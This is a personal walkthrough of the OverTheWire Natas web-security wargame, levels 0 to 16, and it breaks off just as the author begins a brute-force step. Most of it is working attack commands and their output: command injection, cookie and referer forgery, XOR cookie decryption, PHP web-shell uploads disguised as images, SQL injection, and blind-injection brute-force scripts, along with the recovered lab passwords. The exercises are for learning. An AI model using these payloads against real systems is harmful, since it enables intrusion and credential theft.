-- Natas Challenges --

# Level 0:
Just read the html using curl and grepping the password:

>abs@MacBookPro ~ % curl http://natas0.natas.labs.overthewire.org -u natas0:natas0 -s | grep password
```
You can find the password for the next level on this page.
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```


# Level 0 -> 1:

Using the cred from the prev level:
>abs@MacBookPro ~ % curl http://natas1.natas.labs.overthewire.org -u natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -s | grep pass
```
<script>var wechallinfo = { "level": "natas1", "pass": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" };</script></head>
You can find the password for the
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```


# Level 1 -> 2:
>abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI      
```         
...
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

>abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org/files/ -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -s | grep href 
```
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pixel.png">pixel.png</a></td><td align="right">2025-08-15 13:06  </td><td align="right">303 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-08-15 13:06  </td><td align="right">145 </td><td>&nbsp;</td></tr>
```

>abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org/files/users.txt -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI 
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```


# Level 2 -> 3:
>abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s            
```
...
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

>abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/robots.txt -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s 
```
User-agent: *
Disallow: /s3cr3t/
```

>abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/s3cr3t/ -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s 
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /s3cr3t</title>
 </head>
 <body>
<h1>Index of /s3cr3t</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-08-15 13:06  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80</address>
</body></html>
```
>abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s  
```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```


# Level 3 -> 4:
>abs@MacBookPro ~ % curl http://natas4.natas.labs.overthewire.org -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -s   
```
...
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

>abs@MacBookPro ~ % curl natas4.natas.labs.overthewire.org/index.php -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H "Referer: http://natas5.natas.labs.overthewire.org/" -s
```
...
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

# Level 4 -> 5:
>abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -s
```
...
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

>abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -i | grep Cookie
```
Set-Cookie: loggedin=0
```

>abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -i -H "Cookie: loggedin=1" 
```
...
Set-Cookie: loggedin=1
...
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
```



# Level 5 -> 6:

>abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s                                                                        
```
...
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

>abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org/includes/secret.inc -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s 
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

```
>abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s -d "secret=FOEIUWGHFEEUHOFUOIU&submit=no_one_cares" | grep "Access granted"
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```


# Level 6 -> 7:
>abs@MacBookPro ~ % curl natas7.natas.labs.overthewire.org -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS -s 
```
...
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

>abs@MacBookPro ~ % curl "natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS -s
```
...
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```


# Level 7 -> 8:

>abs@MacBookPro ~ % curl "natas8.natas.labs.overthewire.org/" -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -s
```
...
<h1>natas8</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html
```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

some calc:
```
bin2hex(strrev(base64_encode($secret))) = "3d3d516343746d4d6d6c315669563362"
strrev(base64_encode($secret)) = hex2bin("3d3d516343746d4d6d6c315669563362")
base64_encode($secret) = strrev(hex2bin("3d3d516343746d4d6d6c315669563362"))
$secret = base64_deccode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
```


>abs@MacBookPro ~ % python3 -c "import base64; h='3d3d516343746d4d6d6c315669563362'; print(base64.b64decode(bytes.fromhex(h)[::-1]))"
```
b'oubWYf2kBq'
```

>abs@MacBookPro ~ % curl "natas8.natas.labs.overthewire.org/" -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -s -d "secret=oubWYf2kBq&submit=" | grep "Access granted"
```
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```


# Level 8 -> 9:
>abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s                                                     
```
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


>abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=hello & submit="                           
```
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
hello
hello's
hellos
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

index-source.html:
```
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```


I would like to run something like: "grep -i . /etc/natas_webpass/natas" so...
>abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=. /etc/natas_webpass/natas10; file  & submit="
```
Output:
<pre>
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
dictionary.txt: Unicode text, UTF-8 text
</pre>
```


# Level 9 -> 10:
>abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s                                                 
```
For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

index-source.html:
```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

lol this should be easy, I guess they want me to use cat or something the prev level..

>abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s -d "needle=. /etc/natas_webpass/natas11 --exclude  & submit="
```
Output:
<pre>
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
</pre>
```


# Level 10 -> 11:
>abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -s                                                       
```
<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>
```

>abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i  | grep Cookie
```
Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJV3djTRg%3D
Cookies are protected with XOR encryption<br/><br/>
```


>abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))"
```            
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
```

array ^ key = data

key = array ^ data 


>abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" | base64 -d > data
>abs@MacBookPro ~ % python3 -c 'import json; print(json.dumps({"showpassword":"no","bgcolor":"#ffffff"}))' > array                                                                
>abs@MacBookPro ~ % python3 - <<'EOF'
a = open("data","rb").read()
b = open("array","rb").read()

print(bytes([x ^ b[i % len(b)] for i, x in enumerate(a)]))
EOF
```
b'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

So the key is "eDWo".
Thus, the new cookie value should be: "eDWo" ^ {"showpassword":"yes","bgcolor":"#ffffff"}
>abs@MacBookPro ~ % python3 - <<'EOF'
a = '{"showpassword":"yes","bgcolor":"#ffffff"}'.encode()  # default UTF-8
b = "eDWo".encode()  # default UTF-8

res = bytes([x ^ b[i % len(b)] for i, x in enumerate(a)])
import base64

print(base64.b64encode(res).decode())
EOF
```
HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```

>abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i -H "Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" 
```
<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
```


# Level 11 -> 12:
>abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s
```
<body>
<h1>natas12</h1>
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="hzxjlqm5f1.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

index-source.html:
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

Let's create a php file, that will read the "/etc/natas_webpass/natas13":

>abs@MacBookPro OverTheWire % cat > nani.php <<'EOF'
```
<?php
echo shell_exec("cat /etc/natas_webpass/natas13");
?>
EOF
```

>abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s -F "filename=nani.php" -F "uploadedfile=@nani.php"
```
...
<h1>natas12</h1>
<div id="content">
The file <a href="upload/9kxythwuv7.php">upload/9kxythwuv7.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

>abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/upload/9kxythwuv7.php" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s                              
```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```


# Level 12 -> 13:

>abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s 
```
...
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>


<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="460bkiwv0q.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

index-source.html:
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```


Same as the prev level, but I actually need to convince it that my file is an image...
From https://www.php.net/manual/en/function.exif-imagetype.php:
"When a correct signature is found, the appropriate constant value will be returned otherwise the return value is false"
So it's not checking the extension, but the header's magic...
According to wiki, the magic is "FF D8 FF EE".

>abs@MacBookPro OverTheWire % echo '\xFF\xD8\xFF' > nani.php && cat >> nani.php <<'EOF'
```
<?php
echo shell_exec("cat /etc/natas_webpass/natas14");
?>
EOF
```

>abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s -F "filename=nani.php" -F "uploadedfile=@nani.php" | grep php
```
The file <a href="upload/gavovcbgos.php">upload/gavovcbgos.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

>abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/upload/gavovcbgos.php" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s 
```
???
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```


# Level 13 -> 14:
>abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s  
```
...
<h1>natas14</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

SQL lesgooo

Let's see how the query is actually looks like:

>abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/index.php?debug=1" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s -F "username=art" -F "password=vandelay"
```
...
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="art" and password="vandelay"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

>abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/index.php?debug=1" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s -F "username=Vandelay\" OR 0=0 -- \""
```
...
<b>Notice</b>:  Undefined index: password in <b>/var/www/natas/natas14/index.php</b> on line <b>19</b><br />
Executing query: SELECT * from users where username="Vandelay" OR 0=0 -- "" and password=""<br>Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```


# Level 14 -> 15:
>abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s                                     
```
<h1>natas15</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```


>abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/index.php?debug=1" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s -F "username=natas16"
```
...
<h1>natas15</h1>
<div id="content">
Executing query: SELECT * from users where username="natas16"<br>This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```



>abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/index.php?debug=1" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s -F "username=natas15\" OR 0=0 --\""
```
...
<h1>natas15</h1>
<div id="content">
Executing query: SELECT * from users where username="natas15" OR 0=0 --""<br>This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

Brute-forcing the password:
```
#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASS_LEN=32
URL="natas15.natas.labs.overthewire.org/index.php"
LOGIN="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
PASS=""

for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
		OUT=$(curl $URL -u $LOGIN -s -F "username=natas16\" AND BINARY SUBSTRING(password,$pos,1)=\"$char\" -- \"" | grep "This user exists" | wc -l)
		if [ "$OUT" -eq 1 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas16: $PASS"
```

>abs@MacBookPro OverTheWire % chmod +x brute_force_natas15.sh 

>abs@MacBookPro OverTheWire % ./brute_force_natas15.sh 
```
Password for natas16: hpkjkyvilqctew33qmuxl6edvfmw4sgo
```

IF FAILS!!! because it's all LC?! fml

Added BINARY infront if SUBSTRING for binary conversion before comp..
>abs@MacBookPro OverTheWire % ./brute_force_natas15.sh 
```
Password for natas16: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```


# Level 15 -> 16:
>abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s
```
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

index-source.html:
```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```


I have an awful idea...

>abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s -d "needle=\$(grep 3 /etc/natas_webpass/natas17)hello&submit="
```
Output:
<pre>
hello
hello's
hellos
</pre>
```

Let's do some scripting:
```
#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
URL="natas16.natas.labs.overthewire.org"
LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
PASS=""

for char in $(echo $CHARS | fold -w1); do
	OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $char /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
	if [ "$OUT" -eq 0 ]; then
		PASS+=$char
		echo "pass so far: $PASS"
	fi
done

echo "Password for natas16: $PASS"
```

The chars used in the password are:

>abs@MacBookPro OverTheWire % ./brute_force_natas16.sh
```
Password for natas16: bhjkoqsvwCEFHJLNOT05789
```

I need to know what is the first char in the passowrd, so I could bruteforce it...

>abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s -d "needle=\$(cut -c 1 /etc/natas_webpass/natas17)&submit=" | grep  -x .
```
E
```

So, it is either e or E, but the chars are bhjkoqsvwCEFHJLNOT05789 so it starts with E !!!

Let's do the bruteforcing:
```
